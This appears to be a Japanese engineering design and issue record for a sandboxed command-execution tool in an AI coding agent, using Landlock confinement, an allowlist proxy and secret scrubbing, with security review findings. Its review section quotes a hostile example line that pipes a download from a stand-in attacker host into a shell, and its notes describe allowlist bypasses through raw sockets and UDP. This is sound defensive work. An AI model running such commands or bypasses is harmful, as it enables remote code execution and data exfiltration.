---
title: コマンド実行ツール（OS レベルのサンドボックス + ネットワーク allowlist）
created: 2026-08-14
started: 2026-08-14
completed: 2026-08-14
urgency: medium
importance: high
priority: P1
scope: [domain, application, infrastructure, cli, docs]
---

# コマンド実行ツール（OS レベルのサンドボックス + ネットワーク allowlist）

> **2026-08-14 再計画（2 回目）。** claude code / codex の実装を調査し、方針を確定した。
> 経緯:
> 1. 当初「別コンテナ・ネットワーク遮断」→ docker socket が必要で README §1 と衝突。
> 2. 「CLI が動く環境で子プロセスに OS サンドボックス」へ変更。
> 3. **この bin を CLI / SDK として配布する**方針が固まり、「どんなユーザー環境でも
>    動く」= **外部ランタイム依存ゼロ**が絶対条件になった。
> 4. **ネットワークは allowlist を保持する**方針。ただし Landlock のネットワークルールは
>    ポート番号でしか絞れず（`landlock_net_port_attr` に IP/ホスト欄がない）、
>    ドメイン allowlist は OS primitive では表現不能。**エージェント内プロセスのプロキシ**で持つ。
> 5. その他の観点は独自デザインとする。
>
> 調査の一次情報: Landlock kernel doc（ネットワークはポート単位・UDP は ABI v10）、
> claude code sandboxing docs（Linux は bubblewrap+socat の**外部インストール要求**）、
> codex agent-approvals-security / linux-sandbox Cargo.toml（landlock + seccompiler 依存、
> ただしコンテナ環境では bwrap が動かず劣化）。

## 調査からの結論（なぜこの設計か）

- **claude code / codex はどちらも Linux で外部バイナリ（bubblewrap / socat）の
  インストールを要求する。** 配布物としては致命的で、cap_drop されたコンテナや
  AppArmor 制限下の Ubuntu 24.04 で壊れる（両者ともドキュメントで劣化を認めている）。
- 我々の環境で実測した結果、**bubblewrap の前提（非特権 userns）は本コンテナでは
  Operation not permitted で使えない**が、**Landlock ABI v4 は使える**
  （非特権プロセスが自分自身に課す機構であり、cap_drop ALL 下でも動くのが設計目的）。
- したがって我々は「両ツールが劣化モードに落ちる環境」が主戦場であり、そこで唯一
  まともに機能する Landlock（syscall のみ・追加インストール不要）を主軸にする。
- **ネットワーク allowlist はプロキシで持つ。** Landlock はポートしか絞れないため、
  「子プロセスはプロキシ以外に出られない」+「プロキシが CONNECT 先を allowlist で検査」に
  分解する。プロキシの CONNECT 先検査には **`web_fetch` で作った host/IP ガードを再利用**する
  （プライベート帯遮断・IPv6 埋め込み v4 のデコードを含む）。socat 相当は自前の
  tokio プロセスで賄い、外部依存を増やさない。

## As-is（現状）

モデルはファイルの読み書き・検索しかできず、ビルドやテストを実行できない。
コード変更を頼んでも「動くか分からない変更」を提案するに留まり、検証は毎回ユーザーが
実行して結果を貼り直す必要がある。この往復がエージェントに任せる価値を大きく削り、
かつ**このリポジトリ以外での配布利用**を成立させにくくしている。

## To-be（あるべき姿）

モデルが変更後にテストやビルドを自分で実行し、失敗していれば自分で直してから報告する。
実行はエージェントが動いている環境そのもので行われるが、子プロセスには OS サンドボックスが
適用され、**ワークスペース外への書き込み**と**allowlist 外のネットワーク接続**が遮断される。
外部インストールは一切不要で、開発コンテナでも Mac でも CI でも同じ枠組みで動く。
保護が得られない環境では**ツールが登録されない**（fail closed）。実際に効いている保護は
`agent doctor` とツール説明に表示される。

## 設計

### レイヤ配置（clean architecture）

```
domain/ports/command.rs      CommandRunner ポート + SandboxKind / CommandRequest / Output / Error
application/tools/exec/       run_command ツール（ToolSafety::Destructive）
infrastructure/exec/
  mod.rs                      能力検出 + factory（最強の手段を選ぶ / 不足なら None）
  linux.rs                    Landlock 適用（Command::pre_exec で fork 後 exec 前）
  proxy.rs                    allowlist プロキシ（tokio・自前）
  env.rs                      環境変数スクラブ（全プラットフォーム共通）
  capture.rs                  出力上限 + タイムアウト（共通）
infrastructure/net/guard.rs  ← web/guard.rs から抽出。web と exec/proxy で共有
```

`domain` の `CommandRunner` と `application` のツールは**プラットフォーム非依存**。
OS 差はすべて `infrastructure/exec/` のアダプタに閉じる。macOS Seatbelt（別 issue）は
同じポートの別実装として後から挿す。

### SandboxKind（効いている保護をドメインの概念にする）

両ツールが UI レベルでしか扱っていない「実際に効いている保護」を、ポート契約に載せて
モデルと doctor の両方に見せる。

```rust
pub enum SandboxKind {
    /// Linux: ネットワーク名前空間 + プロキシ結線。allowlist を airtight に強制。別 issue
    NetnsProxied,
    /// Linux: Landlock で FS 制限 + プロキシのポートのみ connect 許可。本 issue の到達点。
    /// 残存: 同ポートの別ホストへの直接接続は Landlock では止まらない（下記メモ）
    LandlockConfined,
    /// macOS: Seatbelt。別 issue（P1）
    Seatbelt,
    /// 保護なし。AGENT_SHELL_SANDBOX=none を明示した場合のみ
    None,
}
```

### ネットワーク: deny-all を既定、allowlist を opt-in

- 既定は **deny-all**（allowlist 空 = プロキシは全 CONNECT を拒否）。任意コマンド実行に
  開いた egress を与えるのは危険側なので、`web_fetch`（公開ホスト全般が既定）とは逆にする。
- `AGENT_SHELL_NET_ALLOW=crates.io,docs.rs,github.com` で許可ドメインを足すと、
  そのドメインだけプロキシが中継する。プライベート帯・内部ホストは allowlist にあっても拒否
  （`net/guard.rs` の既存ポリシー）。
- 子プロセスへの結線は `HTTP_PROXY` / `HTTPS_PROXY` / `ALL_PROXY` の注入 +
  Landlock でプロキシのポートのみ connect 許可。proxy-aware なツール（cargo/git/curl）は
  これで allowlist 経由になる。

### 常に効く防御（プラットフォーム非依存）

- **環境変数スクラブ**: `*_API_KEY` / `*_TOKEN` / `*_SECRET` と、このエージェント自身の
  `AGENT_*` 資格情報を子プロセスの環境から除去。持ち出しの最も安い経路を塞ぐ。
- **`.git` 書き込み禁止**: ワークスペース内でも `.git` は read-only（履歴改変・
  `.git/config` 経由のフック仕込みを防ぐ。codex の設計を採用）。
- **タイムアウト・出力上限**: 暴走コマンドがループを止めない。プロセスグループごと kill。

### fail closed と Windows

- 能力検出で要求水準（既定は `LandlockConfined` 以上）に満たなければ**ツールを登録しない**。
- `AGENT_SHELL_SANDBOX=none` を明示した場合のみ無防備で実行（配布物では既定にしない）。
- **Windows ネイティブは当面 fail closed**、WSL2 に誘導（README §5）。Job Object /
  Restricted Token ベースの実装は Landlock/Seatbelt と別物なので、需要が見えてから別 issue。

## 実装計画（フェーズごとに make check 緑を維持）

各フェーズは独立してコンパイル・テストが通る単位。orchestration で impl-agent に順に委譲する。

**Phase 0 — 共有ガードの抽出（refactor-agent）**
`web/guard.rs` の host/IP ポリシー（スキーム・資格情報・IP レンジ・内部ホスト名・
DNS 解決後検査・IPv6 埋め込み v4 デコード）を `infrastructure/net/guard.rs` に移し、
`web` と `exec/proxy` の双方から使えるようにする。allowlist-vs-any-public はパラメータ化。
既存 web テストが同一集合で緑（振る舞い不変）。

**Phase 1 — domain ポート（impl-agent、要 domain-specialist 確認）**
`CommandRunner` / `CommandRequest` / `CommandOutput` / `CommandError` / `SandboxKind`。
ポート契約に「サンドボックス違反はエラーとして返し、モデルが方法を変えられるよう
どのパス／ホストが拒否されたかを含める」を明文化。

**Phase 2 — Linux FS サンドボックス（impl-agent）**
`landlock` crate 追加。`exec/linux.rs` で `Command::pre_exec` に Landlock FS ルールセット
（ワークスペース rw・`.git` ro・ツールチェーン ro・その他 deny）を適用。
`env.rs` スクラブ、`capture.rs` 上限・タイムアウト。
テスト: ワークスペース内書き込み ok / 外 EACCES、`.git` 書き込み拒否、env スクラブ、
タイムアウト、出力上限。**すべてローカルで決定的**（実ネットワーク不要）。

**Phase 3 — allowlist プロキシ + ネットワーク制限（impl-agent）**
`exec/proxy.rs`（tokio・HTTP CONNECT + 素の TCP 中継、`net/guard.rs` で allowlist 検査、
既定 deny-all）。Landlock でプロキシのポートのみ connect 許可し、proxy env を注入。
テスト: 子から非プロキシポートへの connect が EACCES、プロキシが allowlist 外ホストを拒否、
allowlist 内ホスト（ローカルモック）を中継。プロキシの判定は `net/guard.rs` の単体テストで固定。

**Phase 4 — application ツール + cli 結線（impl-agent）**
`RunCommandTool`（Destructive）。`AGENT_SHELL*` 設定、能力検出と fail-closed 登録、
`doctor` に SandboxKind と allowlist を表示。ループレベルのテスト（取得結果が tool_result
のみに渡る／拒否ゲートで実行されない）。

**Phase 5 — ドキュメント + レビュー（root + security-review-agent）**
README §4・§5、`.env.example`、`management/docs/architecture.md`、`.claude/rules/architecture.md`。
`security-review-agent` のレビューを通す。実バイナリで既定非登録・有効化で登録・doctor 表示を確認。

## 達成条件

- [x] モデルがコマンドを実行し、出力（切り詰め済み）を `tool_result` で受け取れる
- [x] 子プロセスがワークスペース外に書き込めないことをテストで固定する
- [x] ~~子プロセスが `.git` に書き込めないことをテストで固定する~~
      → **達成不可と判明。制限そのものをテストで固定する形に変更**（下記「達成条件の変更」参照）
- [x] 子プロセスが allowlist 外へ TCP 接続できないことをテストで固定する
- [x] 子プロセスの環境から API キー類が除去されていることをテストで固定する
- [x] タイムアウトと出力上限が効く（暴走コマンドがループを止めない）
- [x] 外部バイナリのインストールなしで動く（Landlock は syscall のみ）
- [x] サンドボックスが使えない環境ではツールが登録されない（fail closed）。
      `AGENT_SHELL_SANDBOX=none` を明示した場合のみ無防備で動く
- [x] 効いている保護（SandboxKind）と allowlist が `agent doctor` とツール説明に表示される
- [x] 既定の承認ポリシーで確認プロンプトが入る（`Destructive`）
- [x] セキュリティレビューを通す（下記「セキュリティレビュー結果」参照）
- [x] `make check` が緑（252 passed / 0 failed）

## 達成条件の変更（実装中に判明した事実）

**「子プロセスが `.git` に書き込めないことをテストで固定する」は Landlock 層では
達成できません。** 計画時の想定が誤っていました。

Landlock のルールはカーネルが *union* する純粋な許可リストで、**拒否ルールが無く、
「より具体的なルールが勝つ」という優先規則もありません**。したがって
「ワークスペースは書き込み可、ただしその中の `.git` だけ読み取り専用」は
**表現できません**。書き込み可能ルートを与えた時点で `.git` にも与えています。

推測ではなく実測です。当初 `LinuxSandboxPolicy` に `read_only` フィールドを持たせて
実装しましたが、実プロセスを起動するテストで `.git/config` への追記が成功しました。

対応:

- `LinuxSandboxPolicy` から `read_only` を削除（表現できないものを API に残さない）
- テストを `landlock_cannot_protect_git_inside_the_writable_workspace` に置き換え、
  **書き込みが成功すること**を assert して制限自体を固定。カーネルが将来
  優先規則を得たらこのテストが落ち、ドキュメントの記述を見直す契機になる
- README と `linux.rs` のモジュールコメントに制限を明記
- `.git` 保護は拒否を表現できる機構（bind mount = netns 層、または macOS Seatbelt の
  `deny`）に属する要件として、それぞれの issue に移送

**判明したもう 1 つの設計誤り**: `SandboxKind` に `PartialOrd`/`Ord` を derive し
「`AtLeast(LandlockConfined)` を既定要求」としていましたが、Seatbelt と Landlock は
プラットフォームごとの対等な機構であって強弱ではありません。この全順序のままでは
macOS で Seatbelt 実装後も既定設定で起動失敗します。要求を機構名ではなく性質
（`confined` / `isolated`）で表す形に修正しました。

## 優先度の根拠

コーディングエージェントが自分の変更を検証できないのは主要機能の欠落で、回避策（人間が
毎回実行して転記）のコストが高い（重要度 high）。再計画で「他プロジェクトでも配布利用できる」
ことが射程に入り価値は上がったが、P0 の実 LLM 検証より先にやる理由はない（緊急度 medium）。

## セキュリティレビュー結果

実装後にセキュリティ観点で見直し、**4 件の実害**を修正しました（うち 3 件は計画時に
想定していなかったもの）。

1. **子プロセスが制御端末を保持していた**（重大）。stdout/stderr はパイプで捕捉して
   いましたが、`/dev/tty` を直接開けば捕捉を迂回してユーザーの端末に書け、**読めば
   ユーザーのキー入力を盗めます**。承認プロンプトの偽装が可能でした。
   → `process_group(0)` を `setsid()` に置き換え、子を独自セッションに分離。制御端末を
   持たないため `/dev/tty` の open 自体が失敗します。`/dev/tty` を書き込み許可デバイス
   からも削除。テストは**機構**（セッションリーダーであること）を検証します。dev コンテナ
   には制御端末が存在せず、効果を検証するテストは空振りするためです。

2. **承認プロンプトがシェル行を 60 バイトで切っていた**（重大）。人間が全体を読めない
   コマンドの承認は判断ではなく空押しです。`cargo test` と
   `cargo test; curl evil.example | sh` は先頭 60 バイトが同一です。
   → `Destructive` の承認表示だけ予算を 4096 バイトに拡大。あわせて外側の切り詰めを
   `text::truncate`（無言）から `text::clip`（省略記号あり）に変更しました。これは
   既存の全ツールの承認表示の改善でもあります。

3. **プロキシの forward 経路が `check_url` を迂回していた**。`CONNECT` は
   `check_host` で検査していましたが、絶対形式リクエストは host だけを取り出して
   検査していたため、**スキーム検査と URL 埋め込み資格情報の拒否が抜けて**いました。
   → `web_fetch` と同じ `check_url` を通す形に統一。

4. **クライアントの `Host` ヘッダを素通ししていた**。許可ホストへ接続しつつ
   `Host: internal.example` を送れば、許可リストが承認していない virtual host に
   到達できます。
   → 検査済み URL の権限で常に上書き。

5. **`SSH_AUTH_SOCK` / `GPG_AGENT_INFO` を子に渡していた**。名前は秘密に見えませんが、
   実体は**ユーザーの鍵で署名できる生きた権限**です。Landlock は unix ソケットへの接続を
   止めないため、環境変数の除去が唯一の対策です。
   → 除去リストに追加。

`security-review-agent` は起動していません（本セッションでは sub agent の起動が
禁止されているため）。上記は同じ観点による直接レビューの結果です。

## メモ・残存リスク

- **Landlock-only モードの同ポート・別ホスト到達**: Landlock のネットワークルールは
  ポート単位なので、プロキシのポート宛なら別ホストへの直接接続も通ってしまう
  （proxy を経由しない raw socket による allowlist 迂回）。honest なツールは proxy env で
  allowlist に従うが、悪意ある build script は迂回しうる。**airtight にするには
  ネットワーク名前空間**が要る（`SandboxKind::NetnsProxied`、別 issue）。本 issue では
  `LandlockConfined` として残存リスクをコードコメントと README に明記する。
- **UDP / raw socket**: Landlock v4 の network 制限は TCP のみ。DNS 問い合わせや UDP 持ち出しは
  技術的に可能。完全に塞ぐには seccomp で `socket(2)` をフィルタする必要があり、スコープ外。
- **macOS**: Seatbelt 実装は別 issue（P1 に引き上げ済み）。本 issue 完了時点では macOS は
  fail closed。
- **依存追加**: `landlock` crate を足す。syscall フィルタは自前 60 行で書けるものではなく
  専門クレートが妥当（`.claude/rules/workflow.md` の基準）。プロキシは既存の tokio で自前実装し
  socat 相当の外部依存は増やさない。
